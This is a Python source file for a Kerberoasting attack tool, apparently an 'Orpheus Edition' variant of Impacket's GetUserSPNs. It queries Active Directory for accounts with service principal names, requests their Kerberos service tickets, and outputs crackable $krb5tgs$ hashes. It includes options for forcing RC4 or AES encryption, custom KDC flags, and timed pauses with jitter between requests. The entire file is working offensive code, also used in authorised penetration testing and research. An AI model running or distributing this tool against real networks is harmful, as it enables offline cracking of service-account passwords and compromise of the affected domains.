#!/usr/bin/python3
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See LICENSE
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#     Enumerate user-account SPNs and export TGS material for offline analysis.
#     This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#     https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#     Original idea of implementing this in Python belongs to @skelsec and his
#     https://github.com/skelsec/PyKerberoast project
#
import argparse
import logging
import os
import sys
from importlib.metadata import version as _dist_version, PackageNotFoundError as _DistNotFound
from datetime import datetime
from binascii import hexlify
from time import sleep

from pyasn1.codec.der import decoder
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import KerberosError
from orpheus_kerberos import get_tgt_for_credentials, get_tgs, validate_key_material
from orpheus_runtime import (
    ResultWriter, RunSummary, atomic_save, bounded_delay, load_usernames,
    normalize_kdc_options,
)
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection


class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        self.__options = cmdLineOptions.options
        self.__encryption = cmdLineOptions.encryption
        self.__overwrite = getattr(cmdLineOptions, 'overwrite', False)
        try:
            self.__sleep = int(cmdLineOptions.sleep)
        except:
            print("Invalid sleep integer value.")
            self.__sleep = 0
        try:
            self.__jitter = int(cmdLineOptions.jitter)
        except:
            print("Invalid jitter integer value.")
            self.__jitter = 0
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        self.baseDN = ','.join('dc=%s' % part for part in self.__targetDomain.split('.'))
        # A fixed KDC would also be used for referrals into another domain.
        if user_domain != target_domain and self.__kdcHost:
            logging.warning('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None
    
    def haveARest(self):
        if self.__sleep > 0:
            restFor = bounded_delay(self.__sleep, self.__jitter)
            print("Waiting " + str(restFor) + " seconds until next TGS request.")
            sleep(restFor)

    def _validate_ccache_destinations(self, usernames):
        if not self.__saveTGS or self.__overwrite:
            return
        for username in usernames:
            cache_path = '%s.ccache' % username
            if os.path.exists(cache_path):
                raise FileExistsError('ccache already exists: %s' % cache_path)

    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % self.__targetDomain)
        else:
            try:
                s.logoff()
            except Exception:
                # Server metadata remains usable if anonymous logoff fails.
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self, encType=None):
        """Acquire a TGT; encType is retained for caller compatibility only."""
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            # Fall back to credentials when the cache cannot be loaded.
            pass
        else:
            if self.__domain == '':
                domain = ccache.principal.realm['data']
            else:
                domain = self.__domain
            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
            creds = None
            if ccache:
                creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                logging.debug('Using TGT from cache')
                return TGT
            else:
                logging.debug("No valid credentials found in cache. ")

        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        tgt, cipher, _, sessionKey = get_tgt_for_credentials(
            userName, self.__password, self.__domain,
            self.__lmhash, self.__nthash, self.__aesKey,
            kdc_host=self.__kdcHost,
        )
        return {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}

    def format_tgs(self, tgs, username, spn):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # RC4 stores its 16-byte checksum first (RFC 4757); AES stores 12 bytes last.
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))
            return None
        return entry

    def save_tgs_cache(self, tgs, oldSessionKey, sessionKey, username):
        logging.debug('About to save TGS for %s' % username)
        cache_path = '%s.ccache' % username
        if os.path.exists(cache_path) and not self.__overwrite:
            raise FileExistsError('ccache already exists: %s' % cache_path)
        ccache = CCache()
        ccache.fromTGS(tgs, oldSessionKey, sessionKey)
        atomic_save(ccache.saveFile, cache_path, self.__overwrite)

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        entry = self.format_tgs(tgs, username, spn)
        if self.__saveTGS is True:
            self.save_tgs_cache(tgs, oldSessionKey, sessionKey, username)
        if entry is None:
            return False
        if fd is None:
            print(entry)
        else:
            fd.write(entry + '\n')
        return True

    def run(self):
        if self.__usersFile:
            return self.request_users_file_TGSs()

        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # Retry over LDAPS when the server requires stronger authentication.
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise

        searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer))"

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
        else:
            searchFilter += ')'

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=100000)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # Keep partial results; this search does not use paging.
                resp = e.getAnswers()
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))

        if len(answers)>0:
            self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"])
            print('\n\n')

            if self.__requestTGS is True or self.__requestUser is not None:
                # Request once per account, even when it has multiple SPNs.
                users = dict.fromkeys(vals[1] for vals in answers)
                self._validate_ccache_destinations(users)

                enctype = self.__encryption
                TGT = self.getTGT(enctype)

                print("Orpheus custom ticket options")
                print("")

                print("Setting encryption to eType " + str(enctype))                   

                kdcopt = self.__options
                if kdcopt == None:
                    kdcopt = "0x40810010"

                _, option_indexes = normalize_kdc_options(kdcopt)
                for idx in option_indexes:
                    print("Adding " + constants.KDCOptions(idx).name)

                print("")

                summary = RunSummary()
                with ResultWriter(self.__outputFileName, self.__overwrite) as writer:
                    for i, user in enumerate(users):
                        if i:
                            self.haveARest()
                        summary.attempted += 1
                        sAMAccountName = user
                        downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
                        try:
                            principalName = Principal()
                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                            principalName.components = [downLevelLogonName]
                            tgs, _, oldSessionKey, sessionKey = get_tgs(
                                principalName, self.__domain, self.__kdcHost,
                                TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                                self.__options, enctype,
                            )
                            emitted = self.outputTGS(
                                tgs, oldSessionKey, sessionKey, sAMAccountName,
                                self.__targetDomain + "/" + sAMAccountName,
                                writer if self.__outputFileName is not None else None,
                            )
                            if emitted:
                                summary.succeeded += 1
                            else:
                                summary.skipped += 1
                        except Exception as e:
                            summary.failed += 1
                            logging.debug("Exception:", exc_info=True)
                            logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))
                return summary

        else:
            print("No entries found!")
        return RunSummary()

    def request_users_file_TGSs(self):
        return self.request_multiple_TGSs(load_usernames(self.__usersFile))

    def request_multiple_TGSs(self, usernames):
        self._validate_ccache_destinations(usernames)
        enctype = self.__encryption
        TGT = self.getTGT(enctype)

        print("Orpheus custom ticket options")
        print("")

        print("Setting encryption to eType " + str(enctype))

        kdcopt = self.__options
        if kdcopt == None:
            kdcopt = "0x40810010"

        _, option_indexes = normalize_kdc_options(kdcopt)
        for idx in option_indexes:
            print("Adding " + constants.KDCOptions(idx).name)

        summary = RunSummary()
        with ResultWriter(self.__outputFileName, self.__overwrite) as writer:
            for i, username in enumerate(usernames):
                if i:
                    self.haveARest()
                summary.attempted += 1
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]

                    tgs, _, oldSessionKey, sessionKey = get_tgs(
                        principalName, self.__domain, self.__kdcHost,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                        self.__options, enctype,
                    )
                    emitted = self.outputTGS(
                        tgs, oldSessionKey, sessionKey, username, username,
                        writer if self.__outputFileName is not None else None,
                    )
                    if emitted:
                        summary.succeeded += 1
                    else:
                        summary.skipped += 1
                except Exception as e:
                    summary.failed += 1
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))
        return summary

def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description='Queries target domain for SPNs running under a user account',
        epilog=(
            'For cache-only Kerberos authentication use -k -no-pass. '
            'KDC options accept a decimal or 0x-prefixed unsigned 32-bit integer. '
            'Sleep and jitter are applied between consecutive ticket requests.'
        ),
    )
    parser.add_argument('target', help='domain/username[:password]')
    parser.add_argument('-target-domain', help='Domain to query when different from the credential domain.')
    parser.add_argument('-usersfile', help='Request one ticket for each non-empty unique username in this file.')
    parser.add_argument('-request', action='store_true', default=False, help='Request TGS tickets for discovered accounts.')
    parser.add_argument('-request-user', metavar='username', help='Restrict the LDAP query and request to one account.')
    parser.add_argument('-save', action='store_true', default=False, help='Save each requested TGS as <username>.ccache; implies -request.')
    parser.add_argument('-outputfile', help='Write formatted TGS hashes atomically; implies -request.')
    parser.add_argument('-debug', action='store_true', help='Enable debug logging.')
    auth = parser.add_argument_group('authentication')
    auth.add_argument('-hashes', metavar='LMHASH:NTHASH', help='Authenticate with 128-bit hexadecimal LM/NT hashes.')
    auth.add_argument('-no-pass', action='store_true', help='Do not prompt for a password; combine with -k for cache-only authentication.')
    auth.add_argument('-k', action='store_true', help='Use Kerberos authentication. Cache-only usage requires -k -no-pass.')
    auth.add_argument('-aesKey', metavar='hex key', help='Authenticate with a 128-bit or 256-bit hexadecimal AES key; enables -k.')
    auth.add_argument('-dc-ip', help='Domain Controller IP or resolvable host used for LDAP and Kerberos.')
    orph = parser.add_argument_group('orpheus')
    orph.add_argument('-options', default='0x40810010', help='KDC options as decimal or 0x-prefixed unsigned 32-bit integer.')
    orph.add_argument('-encryption', type=int, choices=[18, 23], default=18, help='Requested TGS etype: 18=AES-256, 23=RC4.')
    orph.add_argument('-sleep', type=int, default=0, help='Base seconds to wait between consecutive requests.')
    orph.add_argument('-jitter', type=int, default=0, help='Nonnegative +/- jitter applied to sleep.')
    orph.add_argument('-overwrite', action='store_true', help='Replace existing output and ccache files atomically.')
    return parser


def main(argv=None):
    parser = build_parser()
    args = list(sys.argv[1:] if argv is None else argv)
    if not args:
        parser.print_help()
        return 2
    options = parser.parse_args(args)
    logging.getLogger().setLevel(logging.DEBUG if options.debug else logging.INFO)
    if options.sleep < 0 or options.jitter < 0:
        logging.error('sleep and jitter must be nonnegative')
        return 2
    try:
        options.options, _ = normalize_kdc_options(options.options)
    except ValueError as exc:
        logging.error(str(exc))
        return 2
    try:
        validate_key_material(options.hashes, options.aesKey)
    except ValueError as exc:
        logging.error(str(exc))
        return 2
    if options.usersfile and not os.path.isfile(options.usersfile):
        logging.error('users file not found or unreadable: %s', options.usersfile)
        return 2
    user_domain, username, password = parse_credentials(options.target)
    if not user_domain:
        logging.critical('userDomain should be specified!')
        return 2
    target_domain = options.target_domain or user_domain
    if password == '' and username and options.hashes is None and not options.no_pass and options.aesKey is None:
        from getpass import getpass
        password = getpass('Password:')
    if options.aesKey is not None:
        options.k = True
    if options.save or options.outputfile is not None:
        options.request = True
    if options.outputfile and os.path.exists(options.outputfile) and not options.overwrite:
        logging.error('output already exists: %s', options.outputfile)
        return 2
    try:
        summary = GetUserSPNs(username, password, user_domain, target_domain, options).run()
    except (FileExistsError, FileNotFoundError, ValueError) as exc:
        logging.error(str(exc))
        return 2
    except (ConnectionError, OSError) as exc:
        logging.error(str(exc))
        return 4
    except (KerberosError, ldap.LDAPSessionError) as exc:
        logging.error(str(exc))
        return 3
    except Exception as exc:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(exc))
        return 4
    if summary is None:
        return 0
    return int(summary.exit_code(enumeration_only=not options.request))


if __name__ == '__main__':
    try:
        impacket_version = _dist_version('impacket')
    except _DistNotFound:
        impacket_version = '?'
    print('Impacket v{}\n\nOrpheus Edition - Written by Ben0xA\n'.format(impacket_version))
    sys.exit(main())
